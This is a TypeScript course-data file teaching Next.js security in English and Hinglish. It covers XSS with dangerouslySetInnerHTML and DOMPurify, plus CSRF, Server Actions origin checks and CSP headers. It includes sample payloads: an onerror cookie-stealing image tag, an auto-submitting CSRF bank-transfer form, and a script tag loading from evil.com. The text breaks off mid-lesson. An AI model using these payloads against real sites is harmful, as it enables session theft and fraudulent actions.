/**
 * Next.js Complete Course — Module 12: Security Fundamentals, lessons 1-3.
 *
 * Lesson 1: XSS and why dangerouslySetInnerHTML is the one to fear.
 * Lesson 2: CSRF in a Server Actions world, and secure headers/CSP.
 * Lesson 3: Secrets management and dependency/supply-chain audits.
 */

import type { CourseLesson } from './course-js-module1';

export const NEXTJS_MODULE_12: CourseLesson[] = [
  /* ══════════════════════ Lesson 1 ══════════════════════ */
  {
    slug: 'nextjs-xss-dangerously-set-inner-html',
    title: 'XSS & Why dangerouslySetInnerHTML Is the One to Fear',
    titleHi: 'XSS Aur dangerouslySetInnerHTML Se Kyun Darna Chahiye',
    description:
      "React escapes text content by default, which is why most React apps are naturally resistant to Cross-Site Scripting. dangerouslySetInnerHTML is the explicit, deliberately-named escape hatch that turns that protection off — and its name is a genuine warning, not decoration.",
    descriptionHi:
      'React default se text content ko escape karta hai, yahi wajah hai ki zyadatar React apps naturally Cross-Site Scripting ke against resistant hain. dangerouslySetInnerHTML wo explicit, deliberately-named escape hatch hai jo us protection ko band kar deta hai — aur uska naam ek genuine warning hai, decoration nahi.',
    difficulty: 'HARD',
    duration: 24,
    order: 1,

    analogy: {
      en: "**A restaurant that automatically cooks every raw ingredient before serving it, versus a specific 'serve this completely raw, exactly as handed to us' order that bypasses the kitchen's usual safety process entirely.** A restaurant's standard process cooks food thoroughly before it reaches a customer — a genuine safety step that happens automatically, without a chef needing to remember it every single time. A rare, special order that says 'skip the cooking, serve it exactly as received' is occasionally legitimate (a dish genuinely meant to be raw), but it's also exactly the order a health inspector would flag first if something made a customer sick — because it's the one path where the kitchen's automatic safety process was deliberately bypassed. React escaping text by default is the automatic cooking; dangerouslySetInnerHTML is that flagged, special order.",
      hi: 'Ek restaurant jo automatically har raw ingredient ko cook karta hai serve karne se pehle, versus ek specific \'ise bilkul raw serve karo, exactly jaise hume diya gaya\' order jo kitchen ke usual safety process ko poori tarah bypass karta hai. Ek restaurant ka standard process khane ko thoroughly cook karta hai customer tak pahunchne se pehle — ek genuine safety step jo automatically hota hai, ek chef ko har single baar isse yaad rakhne ki zaroorat ke bina. Ek rare, special order jo kehta hai \'cooking skip karo, ise exactly jaise receive kiya waisa serve karo\' occasionally legitimate hota hai (ek dish jo genuinely raw hone ke liye meant hai), par ye bhi exactly wo order hai jise ek health inspector sabse pehle flag karega agar kisi customer ko kuch bimar kare — kyunki ye wo ek path hai jahan kitchen ka automatic safety process deliberately bypass kiya gaya. React ka default se text escape karna automatic cooking hai; dangerouslySetInnerHTML wo flagged, special order hai.',
    },

    simple: `**React escapes text automatically — this is why most React code is
already safe from the most common XSS pattern:**

\`\`\`tsx
function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
  // Even if text is "<script>alert('hacked')</script>", React renders
  // it as literal, visible TEXT on the page — not as executable HTML.
  // The browser never interprets it as a tag; it just displays the
  // characters. This protection is automatic and requires no effort.
}
\`\`\`

**\`dangerouslySetInnerHTML\` explicitly turns this protection off — it
tells React "trust this string completely, render it as real HTML,
including any \`<script>\` tags or event handlers it contains":**

\`\`\`tsx
function Comment({ html }: { html: string }) {
  return <p dangerouslySetInnerHTML={{ __html: html }} />;
  // If 'html' contains "<img src=x onerror=\\"stealCookies()\\">",
  // the browser WILL execute that onerror handler — this is a real,
  // working XSS attack if 'html' ever contains untrusted user input.
}
\`\`\`

**The rule: never pass user-generated content into
\`dangerouslySetInnerHTML\` directly.** If you genuinely need to render
user-authored rich text (a blog post written in a rich text editor, a
comment supporting basic formatting), the content must be sanitized
FIRST — run through a library like DOMPurify that strips dangerous tags
and attributes (\`<script>\`, \`onerror\`, \`onclick\`, \`javascript:\` URLs)
while keeping safe formatting (\`<b>\`, \`<i>\`, \`<a>\` with a safe \`href\`):

\`\`\`tsx
import DOMPurify from 'isomorphic-dompurify';

function BlogPost({ rawHtml }: { rawHtml: string }) {
  const safeHtml = DOMPurify.sanitize(rawHtml); // strips dangerous content
  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
}
\`\`\`

**Why the name itself matters:** React's team deliberately named this prop
with the word "dangerously" — an unusually blunt choice for an API name —
specifically so that seeing it in code review, or searching a codebase for
it, immediately flags "this is a place where XSS risk lives, verify it's
handled correctly." Grepping a codebase for \`dangerouslySetInnerHTML\` is
a genuinely useful, common security-audit step for exactly this reason.`,

    simpleHi: `**React automatically text escape karta hai — yahi wajah hai ki
zyadatar React code already sabse common XSS pattern se safe hai:**

\`\`\`tsx
function Comment({ text }: { text: string }) {
  return <p>{text}</p>;
  // Chahe text ho "<script>alert('hacked')</script>", React ise page pe
  // literal, visible TEXT ki tarah render karta hai — executable HTML ki
  // tarah nahi. Browser ise kabhi ek tag ki tarah interpret nahi karta;
  // ye bas characters display karta hai. Ye protection automatic hai
  // aur koi effort nahi chahta.
}
\`\`\`

**\`dangerouslySetInnerHTML\` explicitly is protection ko band kar deta
hai — ye React ko batata hai "is string ko poori tarah trust karo, ise
real HTML ki tarah render karo, kisi bhi \`<script>\` tag ya event handler
samet jo isme ho":**

\`\`\`tsx
function Comment({ html }: { html: string }) {
  return <p dangerouslySetInnerHTML={{ __html: html }} />;
  // Agar 'html' mein "<img src=x onerror=\\"stealCookies()\\">" hai,
  // browser WO onerror handler execute KAREGA — ye ek real, working
  // XSS attack hai agar 'html' kabhi untrusted user input contain kare.
}
\`\`\`

**Rule: user-generated content ko kabhi directly
\`dangerouslySetInnerHTML\` mein pass mat karo.** Agar aapko genuinely
user-authored rich text render karna hai (ek blog post jo ek rich text
editor mein likha gaya, ek comment jo basic formatting support karta
hai), content ko PEHLE sanitize karna chahiye — ek library jaise
DOMPurify se guzarte hue jo dangerous tags aur attributes strip karta hai
(\`<script>\`, \`onerror\`, \`onclick\`, \`javascript:\` URLs) jabki safe
formatting rakhte hue (\`<b>\`, \`<i>\`, \`<a>\` ek safe \`href\` ke saath):

\`\`\`tsx
import DOMPurify from 'isomorphic-dompurify';

function BlogPost({ rawHtml }: { rawHtml: string }) {
  const safeHtml = DOMPurify.sanitize(rawHtml); // dangerous content strip karta hai
  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
}
\`\`\`

**Naam khud kyun matter karta hai:** React ki team ne deliberately is prop
ko "dangerously" word ke saath naam diya — ek API name ke liye ek unusually
blunt choice — specifically taaki code review mein ise dekhna, ya ek
codebase mein ise search karna, immediately flag kare "ye ek jagah hai
jahan XSS risk rehta hai, verify karo ki ye correctly handle hua hai."
Ek codebase ko \`dangerouslySetInnerHTML\` ke liye grep karna exactly isi
wajah se ek genuinely useful, common security-audit step hai.`,

    content: `## Why React's default escaping is a genuine security feature, not
just convenience

When React renders \`{text}\` inside JSX, it converts special HTML
characters (\`<\`, \`>\`, \`&\`, quotes) into their safe, escaped equivalents
before inserting them into the DOM — this happens automatically, for
every piece of text content, without a developer having to remember to
call any sanitization function themselves. This is precisely why so much
ordinary React code is safe from XSS without anyone specifically
"defending" against it: the framework's default behavior already is the
defense.

## What XSS actually accomplishes for an attacker

Cross-Site Scripting means getting the VICTIM'S OWN BROWSER to execute
attacker-controlled JavaScript, in the context of the vulnerable site —
this is powerful precisely because that script then has access to
whatever the victim's browser has: their session cookies (if not
protected — Lesson 2 covers this), their ability to make authenticated
requests as them, and full access to read and modify the page's content
as the victim sees it. This is categorically different from an attacker
running code on their OWN machine; XSS runs the attacker's code with the
victim's own privileges.

## Sanitization is not optional, and it must happen server-side or in a
trusted library, never as a client-only afterthought

DOMPurify (or an equivalent, actively-maintained sanitization library) is
necessary specifically because writing a correct HTML sanitizer yourself
is a genuinely hard, security-critical problem — there are many subtle
ways to smuggle executable behavior into HTML that an ad-hoc regex or
naive tag-stripping approach will miss (event handler attributes,
\`javascript:\` URLs, malformed tags that browsers still parse
permissively). Using a maintained library, kept up to date, is the
practical way to get this right rather than reimplementing sanitization
logic from scratch.

## Where else raw HTML sneaks in, beyond \`dangerouslySetInnerHTML\`

The same category of risk exists anywhere untrusted content is rendered
as markup rather than escaped text — an \`<iframe src>\` built from
untrusted input, dynamically constructing a URL passed to \`href\` without
validating its scheme (a \`javascript:\` URL can execute code when
clicked), or third-party embed widgets that render user-supplied HTML on
your page. The unifying question for all of these: is this content being
treated as DATA (escaped, safe) or as CODE/MARKUP (interpreted, capable of
running)?`,

    contentHi: `## React ka default escaping ek genuine security feature kyun hai, sirf convenience nahi

Jab React JSX ke andar \`{text}\` render karta hai, ye special HTML
characters (\`<\`, \`>\`, \`&\`, quotes) ko unke safe, escaped equivalents
mein convert karta hai unhe DOM mein insert karne se pehle — ye
automatically hota hai, text content ke har piece ke liye, bina ek
developer ko khud kisi bhi sanitization function ko call karna yaad
rakhne ki zaroorat ke. Yahi precisely wajah hai ki itna zyada ordinary
React code XSS se safe hai bina kisi ke specifically "defend" kiye —
framework ka default behavior already hi defense hai.

## XSS actually ek attacker ke liye kya accomplish karta hai

Cross-Site Scripting ka matlab hai VICTIM KE APNE BROWSER ko attacker-
controlled JavaScript execute karwana, vulnerable site ke context mein —
ye precisely powerful hai kyunki wo script phir uske paas access rakhta
hai jo bhi victim ke browser ke paas hai: unke session cookies (agar
protected nahi hain — Lesson 2 ise cover karta hai), unki tarah se
authenticated requests karne ki unki ability, aur page ke content ko
padhne aur modify karne ka full access jaise victim ise dekhta hai. Ye
categorically alag hai ek attacker ke APNE machine pe code chalane se;
XSS victim ke apne privileges ke saath attacker ka code chalata hai.

## Sanitization optional nahi hai, aur ise server-side ya ek trusted library mein hona chahiye, kabhi client-only afterthought nahi

DOMPurify (ya ek equivalent, actively-maintained sanitization library)
specifically zaroori hai kyunki khud ek correct HTML sanitizer likhna ek
genuinely hard, security-critical problem hai — kai subtle tareeke hain
executable behavior ko HTML mein smuggle karne ke jise ek ad-hoc regex ya
naive tag-stripping approach miss kar dega (event handler attributes,
\`javascript:\` URLs, malformed tags jinhe browsers abhi bhi permissively
parse karte hain). Ek maintained library use karna, up to date rakha
gaya, ise sahi karne ka practical tareeka hai scratch se sanitization
logic reimplement karne ke bajaye.

## \`dangerouslySetInnerHTML\` ke alawa raw HTML aur kahan sneak in karta hai

Wahi category ka risk kahin bhi exist karta hai jahan untrusted content
ko markup ki tarah render kiya jata hai escaped text ke bajaye — ek
\`<iframe src>\` jo untrusted input se banaya gaya, dynamically ek URL
construct karna jo \`href\` ko pass kiya jata hai bina uske scheme ko
validate kiye (ek \`javascript:\` URL click hone par code execute kar
sakta hai), ya third-party embed widgets jo aapke page pe user-supplied
HTML render karte hain. In sabke liye unifying sawaal: kya is content ko
DATA ki tarah treat kiya ja raha hai (escaped, safe) ya CODE/MARKUP ki
tarah (interpreted, chalne mein capable)?`,

    examples: [
      {
        title: 'Sanitizing user HTML before rendering it, versus rendering it raw',
        titleHi: 'User HTML ko render karne se pehle sanitize karna, versus ise raw render karna',
        codeJs: `// A comment section where users can write basic formatting (bold, links)

// DANGEROUS: rendering the raw stored HTML directly
function Comment({ comment }) {
  return <div dangerouslySetInnerHTML={{ __html: comment.html }} />;
  // If comment.html was ever saved as "<img src=x onerror=stealCookies()>",
  // every visitor viewing this comment now runs that attacker's script.
}

// SAFE: sanitizing before rendering, stripping dangerous content
import DOMPurify from 'isomorphic-dompurify';

function Comment({ comment }) {
  const safeHtml = DOMPurify.sanitize(comment.html, {
    ALLOWED_TAGS: ['b', 'i', 'a', 'p'], // only these tags survive
    ALLOWED_ATTR: ['href'],              // only href survives on <a>
  });
  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
}`,
        codeTs: `// A comment section where users can write basic formatting (bold, links)

// DANGEROUS: rendering the raw stored HTML directly
function Comment({ comment }: { comment: { html: string } }) {
  return <div dangerouslySetInnerHTML={{ __html: comment.html }} />;
  // If comment.html was ever saved as "<img src=x onerror=stealCookies()>",
  // every visitor viewing this comment now runs that attacker's script.
}

// SAFE: sanitizing before rendering, stripping dangerous content
import DOMPurify from 'isomorphic-dompurify';

function Comment({ comment }: { comment: { html: string } }) {
  const safeHtml = DOMPurify.sanitize(comment.html, {
    ALLOWED_TAGS: ['b', 'i', 'a', 'p'], // only these tags survive
    ALLOWED_ATTR: ['href'],              // only href survives on <a>
  });
  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
}`,
        code: `const safeHtml = DOMPurify.sanitize(comment.html, {
  ALLOWED_TAGS: ['b', 'i', 'a', 'p'],
  ALLOWED_ATTR: ['href'],
});
return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;`,
        output:
          "A comment containing '<img src=x onerror=stealCookies()>' renders as harmless, invisible/broken content after sanitization — the onerror attribute and even the img tag itself are stripped since they're not in the allowlist, while a comment using '<b>important</b>' still renders as bold text.",
        explain:
          "DOMPurify's allowlist approach (ALLOWED_TAGS, ALLOWED_ATTR) is deliberately restrictive by default — anything not explicitly permitted is stripped, which is the safer default than trying to enumerate and block every dangerous pattern individually.",
        explainHi:
          "DOMPurify ka allowlist approach (ALLOWED_TAGS, ALLOWED_ATTR) deliberately default se restrictive hai — jo bhi explicitly permitted nahi hai wo strip ho jata hai, jo har dangerous pattern ko individually enumerate aur block karne ki koshish karne se safer default hai.",
      },
    ],

    mistakes: [
      {
        wrong: `// Trusting that "we control the database" makes stored content safe to render raw
function ProductDescription({ product }) {
  // Product descriptions are entered by internal staff via an admin panel —
  // "surely that's safe, we control who has admin access"
  return <div dangerouslySetInnerHTML={{ __html: product.description }} />;
  // But if the admin panel itself has an XSS vulnerability, or an admin
  // account is ever compromised, this becomes a live attack vector too.
}`,
        right: `// Sanitizing regardless of the content's apparent source
import DOMPurify from 'isomorphic-dompurify';

function ProductDescription({ product }) {
  const safeHtml = DOMPurify.sanitize(product.description);
  return <div dangerouslySetInnerHTML={{ __html: safeHtml }} />;
}`,
        why: "Trusting a content source because it's 'internal' or 'admin-only' ignores that the admin panel itself, or an individual admin account, could be compromised — and defense-in-depth means sanitizing at the point of rendering regardless of where content nominally came from, not relying solely on trust in an upstream system.",
        whyHi:
          "Ek content source ko trust karna kyunki ye 'internal' ya 'admin-only' hai ignore karta hai ki admin panel khud, ya ek individual admin account, compromise ho sakta hai — aur defense-in-depth ka matlab hai rendering ke point pe sanitize karna chahe content nominally kahan se aaya ho, sirf ek upstream system mein trust pe rely karne ke bajaye.",
      },
    ],

    realWorld: [
      {
        en: "A security audit of a React/Next.js codebase almost always starts with grepping for every occurrence of dangerouslySetInnerHTML and manually verifying each one either sanitizes untrusted input first or only ever renders genuinely trusted, developer-authored content — this single search reliably surfaces the highest-risk XSS locations in the entire codebase.",
        hi: 'Ek React/Next.js codebase ka ek security audit almost hamesha \`dangerouslySetInnerHTML\` ke har occurrence ko grep karke shuru hota hai aur manually verify karta hai ki har ek ya to untrusted input ko pehle sanitize karta hai ya sirf genuinely trusted, developer-authored content render karta hai — ye single search reliably poore codebase mein highest-risk XSS locations surface karta hai.',
      },
    ],

    interviewQA: [
      {
        q: "Why does most ordinary React code avoid XSS vulnerabilities without any explicit effort from the developer?",
        qHi: 'Zyadatar ordinary React code bina developer ke kisi explicit effort ke XSS vulnerabilities kyun avoid karta hai?',
        a: "React automatically escapes text content rendered via {expression} syntax in JSX, converting special HTML characters into their safe equivalents before inserting them into the DOM. This happens by default for every piece of text content, which is why the common case is safe without a developer specifically defending against it.",
        aHi: 'React automatically text content ko escape karta hai jo JSX mein {expression} syntax ke through render hota hai, special HTML characters ko unke safe equivalents mein convert karta hai unhe DOM mein insert karne se pehle. Ye default se har text content ke piece ke liye hota hai, yahi wajah hai ki common case safe hai bina ek developer ke specifically defend kiye.',
      },
      {
        q: 'What must happen before untrusted, user-generated HTML is ever passed to dangerouslySetInnerHTML?',
        qHi: 'Untrusted, user-generated HTML ko dangerouslySetInnerHTML mein pass karne se pehle kya hona chahiye?',
        a: "It must be sanitized using a maintained, dedicated library (like DOMPurify) that strips dangerous tags, attributes, and URL schemes while preserving safe formatting. Writing a custom sanitizer is a genuinely hard, security-critical problem that's easy to get subtly wrong.",
        aHi: 'Ise ek maintained, dedicated library use karke sanitize karna chahiye (jaise DOMPurify) jo dangerous tags, attributes, aur URL schemes strip karta hai safe formatting preserve karte hue. Ek custom sanitizer likhna ek genuinely hard, security-critical problem hai jise subtly galat karna aasan hai.',
      },
    ],

    exercises: [
      {
        task: "A code review finds three uses of dangerouslySetInnerHTML: one rendering a hardcoded marketing string written by a developer, one rendering a user's bio field from the database, and one rendering the output of a Markdown-to-HTML converter run on user-submitted text. Decide which need sanitization and why.",
        taskHi: 'Ek code review teen \`dangerouslySetInnerHTML\` ke uses dhundhta hai: ek jo ek developer dwara likha gaya hardcoded marketing string render karta hai, ek jo database se ek user ke bio field ko render karta hai, aur ek jo user-submitted text pe chalaye gaye ek Markdown-to-HTML converter ka output render karta hai. Decide karo kaunse ko sanitization chahiye aur kyun.',
        hint: "Ask, for each: does this HTML's content ever originate from something a user could have typed or influenced, directly or indirectly (including through a converter)?",
        hintHi: 'Har ek ke liye poochho: kya is HTML ka content kabhi kisi aisi cheez se originate hota hai jo ek user type ya influence kar sakta tha, directly ya indirectly (ek converter ke through bhi)?',
      },
    ],

    keyTakeaways: [
      "React escapes text content rendered via JSX's {expression} syntax by default, which is why most React code is naturally resistant to the most common XSS pattern without any explicit developer effort.",
      "dangerouslySetInnerHTML explicitly disables this protection, rendering a string as real HTML including any scripts or event handlers it contains — its deliberately blunt name is meant to flag it as a security-sensitive location.",
      'Any untrusted or user-generated content passed to dangerouslySetInnerHTML must be sanitized first using a maintained library (DOMPurify), never trusted raw regardless of its apparent source.',
      'The underlying question for any content rendering is whether it is treated as data (escaped, safe) or as code/markup (interpreted, capable of running) — this applies beyond dangerouslySetInnerHTML to iframes, dynamically constructed URLs, and third-party embeds.',
    ],
    keyTakeawaysHi: [
      'React JSX ke {expression} syntax se render hone wale text content ko default se escape karta hai, yahi wajah hai ki zyadatar React code naturally sabse common XSS pattern ke against resistant hai bina kisi explicit developer effort ke.',
      'dangerouslySetInnerHTML explicitly is protection ko disable karta hai, ek string ko real HTML ki tarah render karte hue kisi bhi scripts ya event handlers samet jo isme hain — uska deliberately blunt naam ise ek security-sensitive location ki tarah flag karne ke liye hai.',
      'Koi bhi untrusted ya user-generated content jo dangerouslySetInnerHTML ko pass hota hai use pehle ek maintained library (DOMPurify) use karke sanitize karna chahiye, kabhi raw trust nahi karna chahiye chahe uska apparent source kuch bhi ho.',
      'Kisi bhi content rendering ke liye underlying sawaal ye hai ki kya ise data ki tarah treat kiya ja raha hai (escaped, safe) ya code/markup ki tarah (interpreted, chalne mein capable) — ye dangerouslySetInnerHTML se pare iframes, dynamically constructed URLs, aur third-party embeds tak apply hota hai.',
    ],
  },

  /* ══════════════════════ Lesson 2 ══════════════════════ */
  {
    slug: 'nextjs-csrf-server-actions-secure-headers-csp',
    title: 'CSRF in a Server Actions World, Secure Headers & CSP',
    titleHi: 'Server Actions World Mein CSRF, Secure Headers Aur CSP',
    description:
      "CSRF tricks a victim's browser into making a request it didn't intend, using credentials the browser sends automatically. Server Actions have built-in protection against a large share of this, but understanding the underlying attack — and layering on secure headers and a Content Security Policy — is what makes an app's defenses deliberate rather than accidental.",
    descriptionHi:
      'CSRF ek victim ke browser ko trick karta hai ek request banane ke liye jo uska intend nahi tha, un credentials use karte hue jo browser automatically bhejta hai. Server Actions ke paas isme se ek bade share ke against built-in protection hai, par underlying attack ko samajhna — aur secure headers aur ek Content Security Policy ko layer karna — wahi hai jo ek app ke defenses ko deliberate banata hai accidental ke bajaye.',
    difficulty: 'HARD',
    duration: 24,
    order: 2,

    analogy: {
      en: "**A courier who automatically delivers any package with your return address on it, without checking who actually asked them to send it.** A courier service that ships anything bearing your address label, no questions asked about who requested the shipment, can be tricked: someone else fills out a shipping label with your address and hands it to the courier, and the courier — following its normal, automatic process — delivers it as if you'd requested it yourself. A browser automatically attaching a site's cookies to every request TO that site works the same way — a malicious page elsewhere on the internet can craft a request to your bank's site, and the victim's browser attaches their real login cookie automatically, exactly as it would for a request the victim genuinely intended.",
      hi: 'Ek courier jo automatically kisi bhi package ko deliver karta hai jispe aapka return address ho, ye check kiye bina ki actually kisne unhe ise bhejne ko kaha. Ek courier service jo kuch bhi ship karta hai jispe aapka address label ho, koi sawaal poochhe bina ki shipment kisne request ki, trick kiya ja sakta hai: koi aur ek shipping label aapke address ke saath fill karta hai aur courier ko de deta hai, aur courier — apne normal, automatic process ko follow karte hue — ise deliver karta hai jaise aapne khud request kiya ho. Ek browser jo automatically ek site ke cookies ko us site ki har request pe attach karta hai isi tarah kaam karta hai — internet pe kahin aur ek malicious page aapke bank ke site ko ek request craft kar sakta hai, aur victim ka browser unka real login cookie automatically attach karta hai, exactly waise jaise wo ek aisi request ke liye karta jo victim ne genuinely intend ki thi.',
    },

    simple: `**What CSRF actually is:** a malicious site tricks a victim's browser
into making a request to a DIFFERENT site (say, the victim's bank) where
the victim happens to be logged in — the browser automatically attaches
the victim's session cookie to that request, since cookies are sent based
on the DESTINATION domain, not based on where the request originated from.

\`\`\`html
<!-- On evil-site.com, a page the victim visits while ALSO logged into bank.com -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
<!-- The victim's browser sends this WITH their bank.com session cookie
     attached automatically — bank.com sees what looks like a
     genuine, authenticated request from the logged-in victim. -->
\`\`\`

**How Server Actions provide meaningful built-in protection:** Next.js
automatically includes an origin-check for Server Actions — it verifies
that the request actually originated from the same origin (or an
explicitly allowed one) before executing the action, rejecting requests
that claim to invoke a Server Action but arrive from an unrelated origin
like \`evil-site.com\`. This closes off the most straightforward version of
the CSRF attack shown above, specifically for Server Actions.

**Why this doesn't mean "CSRF is fully solved, ignore it":** this
protection is specific to Server Actions — a traditional Route Handler
(\`app/api/.../route.ts\`) accepting state-changing requests (POST, PUT,
DELETE) does NOT get this automatic origin check, and needs its own CSRF
protection if it's cookie-authenticated and reachable cross-origin.

**Secure headers and CSP — a complementary, broader layer of defense:**

\`\`\`ts
// next.config.js — setting security headers app-wide
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'DENY' }, // blocks clickjacking via iframes
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self'", // only load scripts from your own origin
          },
        ],
      },
    ];
  },
};
\`\`\`

**What CSP specifically buys you:** even if an XSS vulnerability
(Lesson 1) somehow slips through, a strict Content Security Policy can
prevent the injected script from actually doing damage — by restricting
which origins scripts, styles, and other resources can be loaded from, an
attacker's injected \`<script src="https://evil.com/steal.js">\` simply
won't execute if \`evil.com\` isn't an allowed script source. CSP is a
second line of defense specifically for when the first line (proper
escaping/sanitization) fails.`,

    simpleHi: `**CSRF actually kya hai:** ek malicious site ek victim ke browser ko
trick karta hai ek DOOSRI site ko ek request banane ke liye (maan lo,
victim ka bank), jahan victim uss waqt logged in hai — browser
automatically victim ka session cookie us request pe attach karta hai,
kyunki cookies DESTINATION domain ke basis pe bheje jaate hain, iss
basis pe nahi ki request kahan se originate hui.

\`\`\`html
<!-- evil-site.com pe, ek page jise victim visit karta hai jabki wo ALSO bank.com pe logged in hai -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>document.forms[0].submit();</script>
<!-- Victim ka browser ise unke bank.com session cookie ke saath automatically
     attach karke bhejta hai — bank.com ko kuch aisa dikhta hai jo ek
     genuine, authenticated request lagta hai logged-in victim se. -->
\`\`\`

**Server Actions meaningful built-in protection kaise provide karte hain:**
Next.js automatically Server Actions ke liye ek origin-check include
karta hai — ye verify karta hai ki request actually wahi origin se aayi
(ya ek explicitly allowed wale se) action execute karne se pehle, un
requests ko reject karte hue jo claim karti hain ek Server Action invoke
karne ka par aati hain ek unrelated origin se jaise \`evil-site.com\`. Ye
upar dikhaye gaye CSRF attack ke sabse straightforward version ko band
karta hai, specifically Server Actions ke liye.

**Iska matlab ye kyun nahi hai "CSRF poori tarah solve ho gaya, ignore
karo":** ye protection Server Actions ke liye specific hai — ek
traditional Route Handler (\`app/api/.../route.ts\`) jo state-changing
requests (POST, PUT, DELETE) accept karta hai use ye automatic origin
check NAHI milta, aur usko apna khud ka CSRF protection chahiye agar ye
cookie-authenticated hai aur cross-origin reachable hai.

**Secure headers aur CSP — defense ka ek complementary, broader layer:**

\`\`\`ts
// next.config.js — app-wide security headers set karna
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          { key: 'X-Frame-Options', value: 'DENY' }, // iframes ke through clickjacking block karta hai
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self'", // sirf apne khud ke origin se scripts load karo
          },
        ],
      },
    ];
  },
};
\`\`\`

**CSP specifically kya deta hai:** chahe ek XSS vulnerability (Lesson 1)
kisi tarah slip through ho jaaye, ek strict Content Security Policy
injected script ko actually damage karne se rok sakta hai — restrict
karke ki kaunse origins se scripts, styles, aur doosre resources load ho
sakte hain, ek attacker ka injected \`<script src="https://evil.com/steal.js">\`
simply execute nahi hoga agar \`evil.com\` ek allowed script source nahi
hai. CSP defense ki ek second line hai specifically jab pehli line
(proper escaping/sanitization) fail ho jaaye.`,

    content: `## Why cookies being sent automatically is the whole vulnerability

Browsers attach a domain's cookies to every request made to that domain,
regardless of which page or site actually triggered the request — this
behavior exists for legitimate reasons (it's what keeps you logged in
across normal navigation) but is exactly what CSRF exploits. The attacker
never needs to know or steal the victim's cookie; they just need the
victim's own browser, with its already-valid cookie, to make a request the
victim didn't actually intend.

## What Server Actions' built-in origin check actually verifies

Next.js checks that a request invoking a Server Action carries an
\`Origin\` header matching the app's own origin (or an explicitly configured
list of allowed origins for cases like a reverse proxy) before executing
it. A request crafted by \`evil-site.com\` attempting to invoke your
Server Action will carry \`evil-site.com\` as its origin, fail this check,
and be rejected before the action's code ever runs. This is a real,
meaningful default — but it's important to know it exists specifically
because it doesn't extend automatically to hand-written Route Handlers,
which is where a developer might mistakenly assume the same protection
applies.

## Why Route Handlers need separate, explicit CSRF protection

A Route Handler accepting POST/PUT/DELETE requests, authenticated via a
cookie, is exactly as vulnerable to CSRF as any traditional server
endpoint would be, since Next.js's automatic origin check is specific to
the Server Actions mechanism. Standard mitigations — checking the
\`Origin\`/\`Referer\` header yourself, or a dedicated CSRF token pattern —
still apply and are still necessary for these routes.

## CSP as defense-in-depth, not a replacement for proper escaping

A Content Security Policy doesn't prevent XSS from happening — it limits
what an XSS payload can actually DO if it does get injected, by
restricting which sources scripts/styles/frames/etc. are allowed to load
from. A strict CSP (\`script-src 'self'\`, no \`unsafe-inline\`) means even a
successfully injected \`<script>\` tag with inline code, or a reference to
an external attacker-controlled script, simply won't execute. This is why
CSP is described as a SECOND layer: proper escaping and sanitization
(Lesson 1) is the first, primary defense, and CSP limits the damage on
the rare occasion the first layer has a gap.

## \`X-Frame-Options\` and clickjacking, briefly

A related but distinct attack, clickjacking, tricks a victim into clicking
something on your site by overlaying it (invisibly) inside an \`<iframe>\`
on an attacker's page, disguised as something else entirely. Setting
\`X-Frame-Options: DENY\` (or the CSP equivalent, \`frame-ancestors 'none'\`)
prevents your pages from being embedded in a frame at all, closing off
this specific attack.`,

    contentHi: `## Cookies automatically bheje jaana poora vulnerability kyun hai

Browsers ek domain ke cookies ko us domain pe har request pe attach karte
hain, chahe kisi bhi page ya site ne actually request trigger ki ho — ye
behavior legitimate wajahon se exist karta hai (yahi wo hai jo aapko
normal navigation ke across logged in rakhta hai) par exactly wahi hai
jise CSRF exploit karta hai. Attacker ko kabhi victim ka cookie jaanne ya
steal karne ki zaroorat nahi; unhe bas victim ke apne browser ki zaroorat
hai, uske already-valid cookie ke saath, ek aisi request banane ke liye
jo victim ne actually intend nahi ki thi.

## Server Actions ka built-in origin check actually kya verify karta hai

Next.js check karta hai ki ek Server Action invoke karne wali request ek
\`Origin\` header carry karti hai jo app ke apne origin se match karta hai
(ya kuch cases ke liye jaise ek reverse proxy ek explicitly configured
allowed origins ki list) ise execute karne se pehle. \`evil-site.com\` dwara
crafted ek request jo aapke Server Action ko invoke karne ki koshish karti
hai apne origin ki tarah \`evil-site.com\` carry karegi, ye check fail
hogi, aur action ka code kabhi chalne se pehle reject ho jaayegi. Ye ek
real, meaningful default hai — par ye jaanna important hai ki ye exist
karta hai specifically kyunki ye automatically hand-written Route
Handlers tak extend nahi hota, jahan ek developer mistakenly assume kar
sakta hai ki wahi protection apply hoti hai.

## Route Handlers ko separate, explicit CSRF protection kyun chahiye

Ek Route Handler jo POST/PUT/DELETE requests accept karta hai, ek cookie
ke through authenticated, exactly utna hi CSRF-vulnerable hai jitna ek
traditional server endpoint hoga, kyunki Next.js ka automatic origin
check Server Actions mechanism ke liye specific hai. Standard mitigations
— khud \`Origin\`/\`Referer\` header check karna, ya ek dedicated CSRF
token pattern — abhi bhi apply hote hain aur in routes ke liye abhi bhi
zaroori hain.

## CSP defense-in-depth ki tarah, proper escaping ka replacement nahi

Ek Content Security Policy XSS ko hone se nahi rokta — ye limit karta hai
ki agar ek XSS payload inject ho jaaye to ye actually kya kar SAKTA hai,
restrict karke ki kaunse sources se scripts/styles/frames/etc. load hone
allowed hain. Ek strict CSP (\`script-src 'self'\`, koi \`unsafe-inline\`
nahi) matlab hai ek successfully injected \`<script>\` tag jisme inline code
ho, ya ek external attacker-controlled script ka reference bhi, simply
execute nahi hoga. Yahi wajah hai ki CSP ko ek SECOND layer ki tarah
describe kiya jata hai: proper escaping aur sanitization (Lesson 1)
pehla, primary defense hai, aur CSP damage limit karta hai us rare
occasion pe jab pehli layer mein ek gap ho.

